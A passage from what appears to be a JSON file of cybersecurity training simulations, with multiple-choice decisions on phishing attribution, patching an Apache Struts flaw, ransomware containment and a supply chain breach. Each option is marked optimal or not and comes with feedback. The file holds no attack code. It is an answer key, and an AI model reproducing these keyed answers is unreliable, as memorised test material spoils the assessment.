with a professional structure including specialists for reconnaissance, email crafting,"}, {"id": "C", "text": "Hacktivist group targeting healthcare organizations", "is_optimal": false, "feedback": "{'short': \"Doesn't match the indicators\", 'detailed': \"Hacktivists are ideologically motivated and typically seek to make public statements - website defacement, data leaks to embarrass targets, or service disruption. This campaign's focus on financial fraud with no ideological messaging or public claims doesn't align with hacktivist patterns. They also rarely invest in sophisticated BEC infrastructure.\", 'consequence': \"Misattribution leads to looking for ideological motives that don't exist an"}, {"id": "D", "text": "Disgruntled insider with knowledge of internal operations", "is_optimal": false, "feedback": "{'short': 'Possible but less likely', 'detailed': 'While the personalization suggests internal knowledge, this information is publicly available through LinkedIn and corporate announcements. The infrastructure (overseas hosting, privacy protection) is more consistent with external actors than insiders. Insiders typically leverage their existing access rather than building external phishing infrastructure.', 'consequence': 'Focusing on insider threat investigation could distract from external thr"}]}, {"id": "decision_4", "title": "Reconnaissance Assessment", "situation": "The emails reference specific internal details: Q4 quarter close timing, board meeting schedules, the new patient portal project, and organizational structure. Your CISO asks how the attackers obtained this information.", "question": "What is the MOST likely reconnaissance method used by these attackers?", "options": [{"id": "A", "text": "They compromised an internal system and harvested information from email or documents", "is_optimal": false, "feedback": "{'short': 'Possible but no evidence supports this', 'detailed': \"Prior compromise would be a significant finding requiring immediate investigation. However, there's no evidence of internal system compromise - no alerts, no suspicious access logs. All the referenced information (quarter close, board meetings, org structure) is available through public sources. Assuming compromise without evidence leads to unnecessary panic.\", 'consequence': 'Launching a full compromise investigation when the info"}, {"id": "B", "text": "Open-Source Intelligence (OSINT) gathering from LinkedIn, corporate website, and news sources", "is_optimal": true, "feedback": "{'short': 'Correct! OSINT is the most common BEC reconnaissance method', 'detailed': \"BEC actors routinely use OSINT to craft convincing pretexts. LinkedIn profiles reveal organizational hierarchy, roles, and recent activities. Corporate websites and press releases announce major projects and personnel changes. News coverage and SEC filings provide financial timing. All the 'insider knowledge' in these emails could be obtained through patient OSINT collection.\", 'consequence': 'Understanding the"}, {"id": "C", "text": "Social engineering calls to the organization posing as vendors or partners", "is_optimal": false, "feedback": "{'short': 'Possible but unnecessary given available public info', 'detailed': \"While BEC actors do sometimes use pretexting calls (vishing), it introduces risk of detection. The information in these emails doesn't require direct contact - it's all available online. Attackers typically minimize interaction until they're ready to execute the fraud.\", 'consequence': 'Looking for evidence of social engineering calls that may not have occurred.'}"}, {"id": "D", "text": "Malware already present on employee devices exfiltrating information", "is_optimal": false, "feedback": "{'short': 'This would be the phishing objective, not prerequisite', 'detailed': \"The phishing emails themselves include malware payloads - this is the GOAL of the attack, not the reconnaissance method. If attackers already had malware on devices, they wouldn't need to phish for credentials. The reconnaissance phase uses passive methods to avoid detection.\", 'consequence': 'Confusing attack phases leads to incorrect investigation focus.'}"}]}, {"id": "decision_5", "title": "Why Did Emails Get Through?", "situation": "Your CISO is concerned: 'We spend millions on email security - why did 35 of these 47 emails reach user inboxes?' Looking at the Proofpoint logs, you need to explain the security gap.", "question": "What is the PRIMARY reason these phishing emails bypassed email security?", "options": [{"id": "A", "text": "Proofpoint failed to detect the malicious content in the email bodies", "is_optimal": false, "feedback": "{'short': \"Content filtering isn't the main issue\", 'detailed': \"The email content was suspicious but not definitively malicious - no malware attachments, no obviously malicious links in the initial emails. BEC emails are designed to appear as legitimate business communication. Content filtering alone struggles with social engineering attacks that don't contain technical indicators.\", 'consequence': 'Focusing on content filtering improvements misses the more fundamental authentication gap.'}"}, {"id": "B", "text": "The attackers used newly registered domains that hadn't been flagged as malicious yet", "is_optimal": false, "feedback": "{'short': 'Contributing factor but not the root cause', 'detailed': 'New domain reputation is a factor - security tools may not have threat intelligence on 4-day-old domains. However, this is expected behavior with typosquatting attacks. The more fundamental issue is that email authentication protocols could have caught these regardless of domain age if properly configured.', 'consequence': 'Partially correct but misses the opportunity to implement stronger authentication controls.'}"}, {"id": "C", "text": "MedCare's DMARC policy is not set to reject, allowing spoofed-looking emails from external domains", "is_optimal": true, "feedback": "{'short': 'Correct! DMARC enforcement is the key gap', 'detailed': \"The emails show 'softfail' for SPF and 'none' for DKIM. This indicates the lookalike domains have their own valid SPF records (they legitimately control those domains), but MedCare's domain doesn't have a DMARC policy that tells receiving servers to reject emails claiming to be from their executives but coming from different domains. With p=reject DMARC, email servers would be instructed to reject emails where the From header do"}, {"id": "D", "text": "The attackers exploited a zero-day vulnerability in Proofpoint", "is_optimal": false, "feedback": "{'short': 'No evidence of this', 'detailed': \"There's no indication of any Proofpoint vulnerability being exploited. The emails were processed normally - some quarantined, some delivered based on scoring. The issue is policy configuration and the inherent challenges of detecting social engineering, not a product vulnerability.\", 'consequence': 'Blaming the vendor diverts attention from configuration improvements within your control.'}"}]}], "passing_score": 70, "max_score": 100}, {"id": "D2-SIM-002", "domain": 2, "type": "SIM", "title": "Vulnerability Management Crisis", "difficulty": "intermediate", "role": "Security Analyst", "organization": {"name": "TechBazaar"}, "introduction": "It's 4:47 PM on Friday when CISA issues an emergency directive: a critical remote code execution vulnerability in Apache Struts has been discovered with active exploitation in the wild. CVE-2024-XXXX has a CVSS score of 10.0. Your initial asset scan shows 847 systems running Apache Struts across web application servers, middleware, and legacy integration systems. The business is preparing for the biggest shopping weekend of the year, and leadership is already pushing back on any downtime. Your vulnerability management program is about to face its biggest test.", "decision_points": [{"id": "decision_1", "title": "Initial Vulnerability Assessment", "situation": "You've received the CISA alert about the Apache Struts vulnerability. Your first task is to understand your exposure. You have access to both Tenable.io and Qualys scanning platforms.", "question": "What is your FIRST priority in assessing your organization's exposure?", "options": [{"id": "A", "text": "Run a new credentialed vulnerability scan across all 12,500 assets to detect the vulnerability", "is_optimal": false, "feedback": "{'short': 'Too slow for emergency response', 'detailed': 'A full credentialed scan across 12,500 assets takes 8-12 hours. In a zero-day situation with active exploitation, you need faster visibility. Better approaches include querying existing asset inventory for known Struts installations or running targeted scans against likely affected systems.', 'consequence': 'You wait 10+ hours for scan results while the vulnerability is actively exploited in the wild.'}"}, {"id": "B", "text": "Query your asset inventory and software management tools to identify systems running Apache Struts", "is_optimal": true, "feedback": "{'short': 'Excellent! Inventory queries provide fastest visibility', 'detailed': \"Asset inventory and software management tools (CMDB, software inventory agents) can provide near-instant results for 'which systems have Struts installed.' This gives you a scope estimate within minutes rather than hours. You can then prioritize targeted vulnerability scans on the identified systems to confirm versions and exposure.\", 'consequence': 'Within 30 minutes, you have a list of 847 potentially affected sy"}, {"id": "C", "text": "Start patching immediately - patch everything and ask questions later", "is_optimal": false, "feedback": "{'short': 'Dangerous without assessment', 'detailed': \"Patching without assessment leads to uncontrolled changes, potential service disruptions, and incomplete remediation. You might patch non-critical systems while leaving critical ones exposed. You also don't know if the patch will cause application issues. Assessment before action is essential.\", 'consequence': 'Uncoordinated patching causes service outages in production while critical systems remain unpatched.'}"}, {"id": "D", "text": "Wait for your vulnerability scanner vendor to release detection signatures before assessing", "is_optimal": false, "feedback": "{'short': 'Too passive for a critical zero-day', 'detailed': \"Vendors typically release signatures within 24-48 hours of disclosure, but with active exploitation, you can't wait. Use available information (affected versions from the advisory) and existing inventory data to begin assessment immediately. Scanner signatures can validate findings later.\", 'consequence': '24-48 hour delay while attackers actively exploit the vulnerability.'}"}]}, {"id": "decision_2", "title": "Understanding CVSS 10.0", "situation": "Your CISO asks you to explain why this vulnerability is rated CVSS 10.0 and what makes it so critical. The score vector is: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H", "question": "Which combination of factors makes this vulnerability receive the maximum CVSS score?", "options": [{"id": "A", "text": "It requires physical access, but once accessed, it provides complete system control", "is_optimal": false, "feedback": "{'short': 'Incorrect - physical access would lower the score', 'detailed': 'Physical access (AV:P) is the MOST restrictive attack vector, significantly lowering CVSS scores. This vulnerability has AV:N (Network), meaning it can be exploited remotely over the network, which is the HIGHEST risk attack vector.', 'consequence': 'Misunderstanding CVSS vectors leads to incorrect risk prioritization.'}"}, {"id": "B", "text": "Network exploitable, no authentication needed, no user interaction, complete system compromise", "is_optimal": true, "feedback": "{'short': 'Correct! This is a perfect storm vulnerability', 'detailed': \"CVSS 10.0 requires the worst case in every metric: Network accessible (AV:N) - exploitable from anywhere; Low complexity (AC:L) - easy to exploit; No privileges required (PR:N) - no authentication needed; No user interaction (UI:N) - victim doesn't need to click anything; Changed scope (S:C) - can affect other systems; High impact to confidentiality, integrity, and availability (C:H/I:H/A:H). This is as bad as it gets.\", 'c"}, {"id": "C", "text": "It affects high-value targets even though exploitation is complex", "is_optimal": false, "feedback": "{'short': \"CVSS doesn't consider target value\", 'detailed': \"CVSS base scores don't consider WHAT systems are affected - only HOW the vulnerability can be exploited. Attack Complexity (AC:L in this case) means exploitation is EASY, not complex. Environmental scoring can add context about specific assets, but that's separate from the base score.\", 'consequence': 'Conflating base and environmental scores leads to inconsistent risk assessment.'}"}, {"id": "D", "text": "The vulnerability has been exploited by nation-state actors", "is_optimal": false, "feedback": "{'short': \"CVSS doesn't consider threat actors\", 'detailed': 'CVSS base scores are purely technical - they measure the characteristics of the vulnerability itself, not who is exploiting it or how actively. Threat intelligence is important context but separate from CVSS scoring. Active exploitation affects prioritization but not the CVSS number.', 'consequence': 'Misunderstanding CVSS scope could lead to incorrect vulnerability management decisions.'}"}]}, {"id": "decision_3", "title": "Prioritization Strategy", "situation": "You've identified 847 affected systems across production, DMZ, staging, and development environments. With limited resources and holiday shopping season approaching, you need to prioritize remediation efforts.", "question": "How should you prioritize the remediation order for these 847 systems?", "options": [{"id": "A", "text": "Remediate all systems simultaneously using automated deployment to minimize total time", "is_optimal": false, "feedback": "{'short': 'High risk approach', 'detailed': 'Simultaneous deployment across 847 systems creates massive change management risk. If the patch causes issues, you could have widespread outages. Additionally, not all systems have the same exposure level - DMZ systems facing the internet are at higher risk than internal development machines. Prioritized waves reduce risk.', 'consequence': 'Patch causes unexpected issues, resulting in widespread service disruption during peak season.'}"}, {"id": "B", "text": "Start with development and staging to validate patches, then production, with internet-facing systems first", "is_optimal": true, "feedback": "{'short': 'Correct! Risk-based prioritization with validation', 'detailed': 'Proper prioritization considers both exposure and change risk: (1) Test in dev/staging first to validate patches work; (2) Prioritize by exposure - internet-facing DMZ systems are at highest risk; (3) Then internal production by business criticality. This balances security urgency with operational stability.', 'consequence': 'Patches validated before production deployment, highest-risk systems protected first, minimal b"}, {"id": "C", "text": "Focus only on production systems - development and staging aren't important", "is_optimal": false, "feedback": "{'short': 'Misses the validation opportunity', 'detailed': \"Dev/staging environments serve two critical purposes: (1) They validate that patches don't break applications before production deployment; (2) If compromised, they could provide attackers access to source code, credentials, or pivot points to production. They should be included in remediation, and dev/staging are ideal for initial patch validation.\", 'consequence': 'Untested patches deployed to production cause application failures. Co"}, {"id": "D", "text": "Prioritize based on system owner availability - patch whatever systems we can get approval for first", "is_optimal": false, "feedback": "{'short': \"Doesn't address actual risk\", 'detailed': 'Availability-based prioritization ignores actual exposure and business criticality. A system owner who responds quickly might own low-risk internal systems, while critical internet-facing systems remain exposed because their owner is unavailable. Risk-based prioritization, potentially with emergency change authority, is more effective.', 'consequence': 'Low-risk systems patched while critical internet-facing systems remain vulnerable.'}"}]}, {"id": "decision_4", "title": "Compensating Controls Decision", "situation": "The business is resistant to patching the Payment Gateway servers immediately, citing 'zero tolerance for downtime' during the pre-holiday period. However, these 8 servers running Struts 2.5.30 are internet-facing and process all customer transactions.", "question": "What is the BEST approach for the Payment Gateway servers while business negotiates timing?", "options": [{"id": "A", "text": "Accept the business decision - schedule patching after the holiday season", "is_optimal": false, "feedback": "{'short': 'Unacceptable risk - active exploitation in the wild', 'detailed': \"With CVSS 10.0, active exploitation, and internet-facing systems processing payment data, delaying patching for 6+ weeks is not a reasonable risk acceptance. This could result in a major breach, PCI-DSS violations, and regulatory penalties far exceeding any downtime costs. Security must escalate if business won't accept necessary risk reduction.\", 'consequence': 'Payment gateway compromised, customer payment data stole"}, {"id": "B", "text": "Implement WAF virtual patching rules immediately, then push for emergency maintenance window for actual patching", "is_optimal": true, "feedback": "{'short': 'Correct! Defense in depth while pursuing proper fix', 'detailed': \"WAF virtual patching provides immediate risk reduction by blocking known exploit patterns. This buys time to negotiate an emergency maintenance window while maintaining protection. The WAF isn't perfect (can be bypassed), so it's a temporary measure while pushing for actual patching. Document the compensating control and residual risk.\", 'consequence': 'Immediate protection via WAF, documented risk position, business h"}, {"id": "C", "text": "Patch the servers immediately without business approval - security overrides business concerns", "is_optimal": false, "feedback": "{'short': 'Right instinct, wrong approach', 'detailed': 'While the security risk is real and urgent, unilateral action without any business coordination damages trust and could cause unplanned outages. Better to implement immediate compensating controls (WAF), escalate to executives with clear risk communication, and use emergency change procedures. Security and business must work together, even in emergencies.', 'consequence': 'Patches applied but cause unexpected service disruption. Security t"}, {"id": "D", "text": "Take the Payment Gateway offline until it can be patched safely", "is_optimal": false, "feedback": "{'short': 'Disproportionate response', 'detailed': 'Taking payment processing offline would cause more business damage than most breach scenarios. Compensating controls can provide meaningful protection while maintaining service. This nuclear option should only be considered if active compromise is detected or if no compensating controls are available.', 'consequence': 'All e-commerce revenue stops. Business impact exceeds estimated breach costs.'}"}]}, {"id": "decision_5", "title": "Legacy System Challenge", "situation": "Your asset discovery reveals 204 systems running Apache Struts 2.3.24, which is end-of-life with no security patches available. These legacy ERP connectors handle real-time inventory synchronization. The CIO says upgrading these systems is a 'multi-million dollar, 9-month project.'", "question": "What is the appropriate approach for these unpatchable legacy systems?", "options": [{"id": "A", "text": "They're internal systems, not internet-facing, so they're low risk - focus on other priorities", "is_optimal": false, "feedback": "{'short': \"Internal doesn't mean safe\", 'detailed': \"While not directly internet-accessible, these systems are reachable from any internal system. If an attacker gains initial access elsewhere (through phishing, another vulnerability, etc.), they could pivot to exploit these legacy systems. 'Internal' reduces but doesn't eliminate risk. With active exploitation, even internal vulnerable systems need protection.\", 'consequence': 'Attacker compromises internet-facing system, pivots internally, and"}, {"id": "B", "text": "Isolate them into a restricted network segment and implement strict access controls", "is_optimal": true, "feedback": "{'short': 'Correct! Network isolation is the key compensating control', 'detailed': \"Network segmentation is the most effective compensating control for unpatchable systems. Moving them to an isolated VLAN with firewall rules limiting connectivity to only essential systems dramatically reduces the attack surface. Combined with enhanced monitoring, this provides meaningful protection for systems that can't be patched while the longer-term upgrade project is planned.\", 'consequence': 'Legacy syste"}, {"id": "C", "text": "Shut down the legacy systems immediately - the risk is too high to operate unpatchable systems", "is_optimal": false, "feedback": "{'short': 'Business impact too severe without alternatives', 'detailed': 'These systems handle real-time inventory sync for e-commerce operations. Shutting them down would cripple order fulfillment. While the security risk is real, compensating controls can provide meaningful protection. Shutdown should be reserved for situations where no compensating controls are available and active compromise is detected.', 'consequence': \"Inventory sync fails, orders can't be fulfilled, massive business disr"}, {"id": "D", "text": "Accept the risk formally with executive sign-off and enhanced monitoring", "is_optimal": false, "feedback": "{'short': 'Risk acceptance requires compensating controls', 'detailed': \"Risk acceptance is a valid business decision, but for a CVSS 10.0 with active exploitation, formal acceptance should include compensating controls that actually reduce risk. Just monitoring doesn't prevent exploitation. Risk acceptance should document what controls ARE implemented, not just acknowledge the vulnerability exists.\", 'consequence': 'Risk is documented but not actually reduced. Monitoring detects compromise afte"}]}], "passing_score": 70, "max_score": 100}, {"id": "D2-SIM-003", "domain": 2, "type": "SIM", "title": "The Ransomware Response", "difficulty": "advanced", "role": "Security Analyst", "organization": {"name": "Precision Manufacturing Corp"}, "introduction": "It's 3:47 AM on Saturday when your phone explodes with alerts. The overnight NOC technician reports 'something weird' - multiple servers displaying ransom notes, file shares inaccessible, and the helpdesk voicemail filling up with panicked messages from the skeleton crew. By the time you remote in, your SIEM is showing a cascade of alerts: mass file encryption events, suspicious PowerShell execution, and lateral movement detections across multiple network segments. The attack is still active. You have critical decisions to make in the next few minutes that will determine whether this becomes a", "decision_points": [{"id": "decision_1", "title": "Initial Response Priority", "situation": "Alerts are cascading across your SIEM. You can see ransomware actively encrypting files on multiple hosts, C2 communication ongoing, and the attack spreading. Your SOC has limited overnight staff. What's your immediate priority?", "question": "What should be your FIRST action in the next 60 seconds?", "options": [{"id": "A", "text": "Begin forensic imaging of affected systems to preserve evidence", "is_optimal": false, "feedback": "{'short': 'Evidence is important but containment comes first', 'detailed': 'Forensic preservation is important for investigation and potential law enforcement involvement, but during an ACTIVE attack with spreading encryption, containment must come first. Every minute spent on forensics while the attack continues means more systems encrypted and more data exfiltrated. Contain first, then investigate.', 'consequence': 'While imaging one system, ransomware encrypts 40 more. Attack spreads to addit"}, {"id": "B", "text": "Isolate affected network segments to stop lateral movement", "is_optimal": true, "feedback": "{'short': 'Correct! Containment is the immediate priority', 'detailed': \"During an active ransomware attack, containment is paramount. Network isolation stops lateral movement and prevents the attack from spreading to unaffected segments. This is a 'stop the bleeding' action that must happen before investigation, evidence collection, or recovery planning. You can't investigate what you haven't contained.\", 'consequence': 'East subnet isolated within 3 minutes. Attack contained to 78 systems inst"}, {"id": "C", "text": "Access the ransom portal to understand the attacker's demands", "is_optimal": false, "feedback": "{'short': 'Dangerous distraction during active attack', 'detailed': \"Accessing the ransom portal provides no immediate operational value and could have negative implications: it confirms to attackers you're aware and may start their clock, it could expose your IP, and it distracts from containment. Ransom negotiation decisions come much later, after containment and assessment.\", 'consequence': \"Time spent on portal while ransomware continues spreading. Attackers know you're engaged and may accel"}, {"id": "D", "text": "Shut down all systems enterprise-wide to prevent further damage", "is_optimal": false, "feedback": "{'short': 'Too broad - impacts unaffected systems unnecessarily', 'detailed': \"Enterprise-wide shutdown is a scorched earth approach that impacts systems that aren't compromised, destroys volatile forensic evidence, and causes massive business disruption. Targeted network isolation of affected segments achieves containment without destroying unaffected operations. Surgical precision over nuclear options.\", 'consequence': 'Manufacturing operations halt (OT was isolated and safe). West facility go"}]}, {"id": "decision_2", "title": "Network Isolation Strategy", "situation": "You've decided to isolate affected segments. Looking at your network topology, the East corporate network (10.50.0.0/16) is clearly compromised with active encryption. The West corporate network (10.60.0.0/16) has no alerts yet. The OT network is air-gapped. The datacenter hosts critical servers.", "question": "What is the optimal network isolation strategy?", "options": [{"id": "A", "text": "Isolate only the specific hosts showing ransomware alerts", "is_optimal": false, "feedback": "{'short': 'Too narrow - attackers likely have broader access', 'detailed': \"By the time ransomware deploys, attackers typically have access to far more systems than are actively encrypting. Isolating only alerting hosts leaves other compromised (but not yet encrypting) systems connected, allowing the attack to continue from those footholds. The attacker's C2 access extends beyond visible ransomware activity.\", 'consequence': 'Isolated 14 hosts but attacker pivots from 23 other compromised system"}, {"id": "B", "text": "Isolate the entire East subnet, protect West-to-Datacenter, verify OT isolation", "is_optimal": true, "feedback": "{'short': 'Correct! Segment-level isolation with protection of critical assets', 'detailed': 'Isolating the entire compromised segment (East) stops all lateral movement from that zone. Protecting the path between unaffected West and the datacenter prevents spread if there are undetected footholds. Verifying OT isolation confirms manufacturing can continue. This balances containment with business continuity.', 'consequence': 'East contained completely. West and datacenter protected. Manufacturing"}, {"id": "C", "text": "Disconnect all networks from the internet to stop C2 communication", "is_optimal": false, "feedback": "{'short': 'Incomplete - internal spread continues without internet', 'detailed': \"While blocking C2 is valuable, modern ransomware operates autonomously once deployed. Disconnecting from internet stops exfiltration and C2 but doesn't stop internal lateral movement or encryption. The ransomware is already inside and will continue spreading internally. Internal segmentation is more critical.\", 'consequence': 'C2 blocked but ransomware continues encrypting internally. Attack spreads to datacenter v"}, {"id": "D", "text": "Focus isolation on protecting the OT network - manufacturing is the priority", "is_optimal": false, "feedback": "{'short': 'OT is already protected by air-gap', 'detailed': \"The scenario states OT is air-gapped with a data diode. It's already isolated by design. Focusing on protecting what's already protected while ignoring the active spread in IT networks wastes time. Verify OT isolation is intact, but prioritize containing the active IT compromise.\", 'consequence': \"OT confirmed isolated (as it already was). Meanwhile, ransomware spreads from East to datacenter because IT segmentation wasn't addressed.\"}"}]}, {"id": "decision_3", "title": "Identifying Patient Zero", "situation": "With the East network isolated, you need to understand how the attack started. Your SIEM shows the earliest alerts originated from YOURK-PC-042 at 03:31, but the encryption started across multiple systems nearly simultaneously at 03:37. This suggests pre-positioning.", "question": "What technique should you use to identify the true initial access point and timeline?", "options": [{"id": "A", "text": "Interview the user of YOURK-PC-042 to ask what they did", "is_optimal": false, "feedback": "{'short': 'Useful but not the primary investigative method', 'detailed': 'User interviews provide context but are unreliable for precise timeline reconstruction. Users may not remember details, may be unavailable at 4 AM, or may be defensive. Technical evidence from logs and EDR provides objective, timestamped data. Interview as supplementary source, not primary.', 'consequence': 'User is asleep and unreachable. Investigation stalls waiting for interview that provides incomplete information anyw"}, {"id": "B", "text": "Review EDR telemetry and email logs to trace backward from first alert", "is_optimal": true, "feedback": "{'short': 'Correct! Technical evidence provides objective timeline', 'detailed': 'EDR telemetry shows process execution, file access, and network connections with precise timestamps. Email logs reveal malicious message delivery. Working backward from the first alert (03:31 PowerShell execution) through EDR history reveals the full attack timeline: email received Friday 16:42, macro executed 16:43, C2 established 16:43, ~11 hours of attacker activity before ransomware deployment.', 'consequence':"}, {"id": "C", "text": "Run antivirus scans across all systems to find the malware origin", "is_optimal": false, "feedback": "{'short': 'Wrong tool for timeline investigation', 'detailed': \"Antivirus identifies current malware presence but doesn't provide historical timeline or show how the attack progressed. By the time ransomware is detected, the initial access malware may be deleted or evolved. AV is a detection tool, not an investigation tool. Use EDR and SIEM for forensic timeline.\", 'consequence': 'AV finds current ransomware but provides no insight into how or when attack started, or what else attackers did.'}"}, {"id": "D", "text": "Focus on recovery - knowing how it started doesn't help stop the current attack", "is_optimal": false, "feedback": "{'short': 'Understanding attack is essential for effective response', 'detailed': \"Understanding initial access and attack timeline is critical for: ensuring containment is complete (are there other access points?), credential compromise assessment (what did attackers access?), determining data exposure (what was exfiltrated?), and preventing reinfection during recovery. You can't effectively recover without understanding the attack.\", 'consequence': \"Recovery begins without understanding attack"}]}, {"id": "decision_4", "title": "Credential Compromise Scope", "situation": "Your investigation reveals the attacker used Mimikatz to dump credentials and has been active for ~11 hours. They achieved lateral movement to file servers and possibly domain controllers. You need to assess credential compromise to plan recovery.", "question": "What is the MOST critical assumption to make about credential compromise?", "options": [{"id": "A", "text": "Only credentials on systems with detected Mimikatz activity are compromised", "is_optimal": false, "feedback": "{'short': 'Dangerously narrow assumption', 'detailed': 'Mimikatz detection represents where you SAW it run - attackers may have run it on other systems without detection, or used other credential theft techniques. Additionally, credentials move with users - if an admin logged into a compromised system, their credentials are compromised even without Mimikatz running there. Assume broader compromise.', 'consequence': 'Reset passwords for 3 accounts while 15 other compromised accounts are overlooke"}, {"id": "B", "text": "All accounts that authenticated to ANY compromised system should be considered compromised", "is_optimal": true, "feedback": "{'short': 'Correct! Assume broad credential compromise', 'detailed': 'Credential theft can capture any credentials present on a compromised system - not just local accounts but any user who authenticated there. Domain credentials, service accounts, cached credentials - all at risk. The safest assumption is that ANY account that touched ANY compromised system is compromised. This drives comprehensive password resets.', 'consequence': 'Comprehensive credential compromise assessment identifies 147 "}, {"id": "C", "text": "Focus only on Domain Admin accounts since those are most critical", "is_optimal": false, "feedback": "{'short': 'Important but incomplete', 'detailed': 'Domain Admin accounts are critical and must be prioritized, but attackers also leverage service accounts (often with excessive privileges), tier-1 admin accounts, and even standard user accounts for persistence. A compromised service account with backup privileges can be devastating. All privileged accounts need assessment.', 'consequence': 'Domain Admin reset completed. Attacker returns via compromised backup service account that was overlooked"}, {"id": "D", "text": "Wait for forensic analysis to confirm which specific credentials were stolen", "is_optimal": false, "feedback": "{'short': 'Too slow during active incident', 'detailed': 'Complete forensic confirmation of credential theft can take days or weeks. During an active incident, you must act on reasonable assumptions. If Mimikatz ran on a system, assume all credentials on that system are compromised. Act now, validate later. The risk of assuming too narrow is recompromise.', 'consequence': 'Waiting for forensics while attacker uses stolen credentials to maintain access and monitor recovery efforts.'}"}]}, {"id": "decision_5", "title": "Data Exfiltration Assessment", "situation": "The ransom note claims data exfiltration. Your network analysis confirms large outbound transfers to Mega.nz cloud storage: approximately 847 GB from Finance, Engineering, HR, and Contracts file shares. This happened before encryption began.", "question": "How does confirmed data exfiltration change your incident response priorities?", "options": [{"id": "A", "text": "It doesn't - exfiltration already happened, focus on ransomware recovery", "is_optimal": false, "feedback": "{'short': 'Exfiltration has major implications beyond ransomware', 'detailed': \"Data exfiltration transforms this from a ransomware incident to a data breach with regulatory notification requirements, potential extortion beyond decryption, and long-term business impact (intellectual property theft). Recovery focus shifts from 'restore systems' to 'breach response' with legal, regulatory, and customer notification requirements.\", 'consequence': 'Organization focuses on technical recovery while mi"}, {"id": "B", "text": "It strengthens the case for paying ransom to prevent data publication", "is_optimal": false, "feedback": "{'short': \"Payment doesn't guarantee data destruction\", 'detailed': 'There is NO guarantee attackers will delete exfiltrated data after payment. They may sell it, use it for future extortion, or simply lie. Multiple victims have paid and still had data leaked. The data is gone - payment decisions should focus on decryption value, not data deletion promises which are unenforceable.', 'consequence': 'Organization pays ransom expecting data deletion. Data appears on leak site 3 months later anyway."}, {"id": "C", "text": "Initiate breach response procedures - legal notification, regulatory assessment, customer impact analysis", "is_optimal": true, "feedback": "{'short': 'Correct! Exfiltration triggers breach response requirements', 'detailed': \"Confirmed exfiltration of PII and sensitive data triggers formal breach response: legal counsel engagement, regulatory notification timeline assessment (many states require notification within 72 hours), customer and employee impact analysis, and preparation for potential data publication. This runs parallel to technical recovery. Breach response has legal deadlines that can't wait for systems to be restored.\","}, {"id": "D", "text": "Focus on identifying exactly what data was taken before any other actions", "is_optimal": false, "feedback": "{'short': \"Detailed analysis important but shouldn't delay notification preparation\", 'detailed': 'Understanding exactly what was exfiltrated is important but can take weeks. Regulatory notification clocks start when you discover the breach, not when you finish analyzing it. Begin breach response procedures immediately while conducting detailed data assessment in parallel. You can refine notifications as analysis progresses.', 'consequence': 'Detailed analysis takes 2 weeks. 72-hour state notifi"}]}], "passing_score": 70, "max_score": 100}, {"id": "D2-SIM-004", "domain": 2, "type": "SIM", "title": "Supply Chain Compromise", "difficulty": "advanced", "role": "Security Analyst", "organization": {"name": "NexGen Software Solutions"}, "introduction": "It's Monday morning when your threat intelligence feed highlights a concerning report: CISA has issued an advisory about a suspected supply chain compromise affecting enterprise software vendors. The advisory mentions indicators associated with a sophisticated threat actor targeting software build pipelines. While reviewing the indicators, your stomach drops - one of the C2 domains has been seen in DNS logs from your build server environment. You pull the logs and confirm: your build server has been communicating with known APT infrastructure for the past 6 weeks. Your software has been distri", "decision_points": [{"id": "decision_1", "title": "Initial Threat Assessment", "situation": "You've matched CISA IoCs to DNS traffic from your build server. The C2 domain 'telemetry-cdn.cloudfront.net' has been queried 847 times over 42 days from BUILD-SRV-01. This is your primary build server for NexGen Endpoint Manager, which is deployed to 2,800 enterprise customers.", "question": "What is your FIRST priority after confirming this IoC match?", "options": [{"id": "A", "text": "Immediately shut down all build infrastructure to stop potential malware distribution", "is_optimal": false, "feedback": "{'short': 'Right instinct but may be premature', 'detailed': \"While stopping further contamination is important, immediate shutdown destroys volatile forensic evidence (memory, network connections, running processes). With 42 days of activity, this isn't a racing-clock scenario. A brief pause to capture forensic state won't significantly increase risk but will dramatically improve investigation capability.\", 'consequence': 'Build servers shut down. Running processes terminated. Volatile evidence"}, {"id": "B", "text": "Capture forensic images and volatile data, then isolate build infrastructure", "is_optimal": true, "feedback": "{'short': 'Correct! Evidence preservation before containment', 'detailed': \"With a sophisticated APT that's been active for 42 days, the immediate risk window is hours, not minutes. Capturing memory dumps, network connection state, and running processes before isolation preserves critical evidence. Then isolate to prevent further activity. This balanced approach enables effective investigation while containing the threat.\", 'consequence': 'Memory dumps captured showing active C2 connection. Proc"}, {"id": "C", "text": "Investigate quietly without isolating - we don't want to alert the attackers", "is_optimal": false, "feedback": "{'short': 'Dangerous - continued access means continued compromise', 'detailed': \"While not alerting attackers has value, allowing continued access to build infrastructure means potentially more compromised builds, more customer impact, and more data exfiltration. The attackers have had 42 days - the priority now is stopping the bleeding. Sophisticated attackers assume they'll eventually be detected.\", 'consequence': 'Investigation continues while attackers maintain access. Additional backdoored"}, {"id": "D", "text": "Contact CISA and FBI before taking any technical actions", "is_optimal": false, "feedback": "{'short': \"Important but shouldn't delay evidence preservation\", 'detailed': \"Law enforcement and CISA notification is absolutely required for a suspected nation-state supply chain attack. However, waiting for them before preserving evidence could mean losing volatile data. Capture forensic state, isolate systems, THEN contact authorities. They'll want to see your evidence anyway.\", 'consequence': 'FBI contacted. They ask what evidence you have. You realize volatile evidence should have been cap"}]}, {"id": "decision_2", "title": "Threat Actor Assessment", "situation": "The CISA advisory attributes this activity to APT29/COZY SPIDER, associated with Russian intelligence services. Your CEO asks: 'Is this really a nation-state attack or could it be regular criminals? How confident should we be in this attribution?'", "question": "How should you characterize this threat actor to leadership?", "options": [{"id": "A", "text": "We can't confirm attribution - focus on the technical indicators, not who's behind it", "is_optimal": false, "feedback": "{'short': 'Attribution matters for risk assessment', 'detailed': 'While technical response is similar regardless of attacker, attribution significantly impacts risk assessment: nation-state actors have different objectives (espionage vs. financial), resources (extensive), patience (years-long operations), and targets (government/defense customers). Leadership needs accurate threat characterization to make informed decisions about notification, resources, and business impact.', 'consequence': 'Le"}, {"id": "B", "text": "CISA attributes to APT29 (Russian SVR) - a sophisticated nation-state actor focused on espionage against government and defense", "is_optimal": true, "feedback": "{'short': 'Correct! Communicate attribution with appropriate context', 'detailed': \"CISA's attribution to APT29 is significant intelligence that leadership needs. APT29's characteristics - targeting government/defense, supply chain methodology, patient long-term access, espionage motivation - directly impact risk assessment. Their government and defense customers face the highest risk. Attribution also triggers specific notification requirements.\", 'consequence': 'Leadership understands severity"}, {"id": "C", "text": "This is definitely Russian government hackers - we need to go public immediately", "is_optimal": false, "feedback": "{'short': 'Overconfident and premature', 'detailed': \"While CISA's attribution is credible, 